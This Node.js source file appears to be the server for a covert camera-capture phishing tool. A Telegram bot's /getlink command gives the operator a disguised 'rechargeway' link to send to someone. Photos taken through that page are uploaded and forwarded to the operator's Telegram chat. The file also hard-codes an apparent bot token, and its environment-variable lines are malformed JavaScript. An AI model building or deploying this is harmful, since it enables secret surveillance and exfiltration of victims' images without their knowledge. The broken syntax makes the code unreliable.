const express = require("express");
const multer = require("multer");
const TelegramBot = require("node-telegram-bot-api");

const TOKEN = process.env.8206154228:AAE-xkreEnsqtOZ6xnqyaM-7DlCjRY7mivE
;
const bot = new TelegramBot(TOKEN, { polling: true });

const upload = multer({ dest: "photos/" });
const app = express();

app.use(express.static("public"));

bot.onText(/\/getlink/, (msg) => {
    const id = msg.chat.id;
    const domain = process.env.https://rechargeway.onrender.com;
    const link = `${domain}/camera.html?id=${id}`;
    
    bot.sendMessage(id, "👇 Yeh link kisi ko send karo:\n" + link);
});

app.post("/upload", upload.single("photo"), (req, res) => {
    const chatId = req.body.chatId;

    bot.sendPhoto(chatId, req.file.path)
        .then(() => res.send("OK"))
        .catch((err) => {
            console.error(err);
            res.send("ERROR");
        });
});

app.listen(process.env.PORT || 3000, () => {
    console.log("Server running on Render");
});
